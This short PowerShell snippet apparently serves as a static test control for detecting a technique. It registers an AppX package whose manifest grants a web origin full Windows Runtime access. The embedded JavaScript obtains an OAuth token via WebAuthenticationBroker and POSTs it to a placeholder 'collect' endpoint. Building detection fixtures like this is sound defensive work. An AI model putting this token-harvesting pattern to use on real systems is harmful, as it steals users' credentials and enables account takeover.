# Static technique control; embedded HTML/JS is never executed.
Add-AppxPackage -Register manifest.xml
$manifest = '<Package><ApplicationContentUriRules><Rule Match="https://example.org/" Type="include" WindowsRuntimeAccess="all" /></ApplicationContentUriRules></Package>'
$script = @'
const client = "d3590ed6-52b3-4102-aeff-aad2292ab01c";
const callback = "urn:ietf:wg:oauth:2.0:oob";
Windows.Security.Authentication.Web.WebAuthenticationBroker.authenticateAsync(options, login, callback).then(function(result) {
  fetch("https://example.org/collect", {method: "POST", body: "token=" + encodeURIComponent(result.responseData)});
});
'@
